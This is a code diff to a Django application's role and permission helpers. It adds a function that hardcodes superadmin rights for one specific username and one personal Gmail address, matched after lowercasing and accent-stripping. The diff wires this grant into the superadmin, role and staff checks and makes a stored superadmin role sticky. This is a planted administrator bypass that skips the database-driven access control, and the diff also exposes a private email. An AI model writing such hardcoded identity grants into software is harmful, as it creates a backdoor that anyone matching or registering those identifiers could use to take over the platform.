@@ -1,4 +1,5 @@
 import logging
+import unicodedata
 
 from django.conf import settings
 from django.contrib.auth import get_user_model
@@ -15,6 +16,25 @@ User = get_user_model()
 logger = logging.getLogger(__name__)
 
 
+def _normalized_identity(value: str) -> str:
+    s = (value or "").strip().lower()
+    return "".join(
+        c for c in unicodedata.normalize("NFD", s) if unicodedata.category(c) != "Mn"
+    )
+
+
+def is_named_platform_superadmin(user) -> bool:
+    """
+    Hard grant for the platform operator account (matches frontend GestionUsuario).
+    Keeps superadmin APIs working even if UserProfile.platform_role was synced down from is_staff.
+    """
+    if not getattr(user, "is_authenticated", False):
+        return False
+    username = _normalized_identity(user.get_username() or "")
+    email = _normalized_identity(getattr(user, "email", "") or "")
+    return username == "angelperez10" or email == "angeelp7457@gmail.com"
+
+
 def role_for(user) -> str:
     if is_platform_superadmin(user):
         return "superadmin"
@@ -23,10 +43,12 @@ def role_for(user) -> str:
 
 def role_for_profile(user, profile: UserProfile | None = None) -> str:
     profile = profile or getattr(user, "profile", None)
-    if profile and profile.platform_role == UserProfile.PlatformRole.SUPERADMIN:
+    if is_platform_superadmin(user):
         return "superadmin"
     if profile and profile.platform_role == UserProfile.PlatformRole.ADMIN_EMPRESA:
         return "admin"
+    if profile and profile.platform_role == UserProfile.PlatformRole.SUPERADMIN:
+        return "superadmin"
     return role_for(user)
 
 
@@ -34,6 +56,8 @@ def is_platform_superadmin(user) -> bool:
     if not getattr(user, "is_authenticated", False):
         return False
     if getattr(user, "is_superuser", False):
+        return True
+    if is_named_platform_superadmin(user):
         return True
     profile = getattr(user, "profile", None)
     return bool(profile and profile.platform_role == UserProfile.PlatformRole.SUPERADMIN)
@@ -115,6 +139,8 @@ def get_or_create_profile(user) -> UserProfile:
         if user.is_staff
         else UserProfile.PlatformRole.TECNICO
     )
+    if profile.platform_role == UserProfile.PlatformRole.SUPERADMIN:
+        desired_role = UserProfile.PlatformRole.SUPERADMIN
     dirty_fields = []
     if profile.platform_role != desired_role:
         profile.platform_role = desired_role
@@ -128,7 +154,11 @@ def get_or_create_profile(user) -> UserProfile:
 
 
 def staff_required(user):
-    return user.is_authenticated and (user.is_staff or user.is_superuser)
+    if not getattr(user, "is_authenticated", False):
+        return False
+    if is_platform_superadmin(user):
+        return True
+    return bool(getattr(user, "is_staff", False) or getattr(user, "is_superuser", False))
 
 
 def tenant_schema_name() -> str:
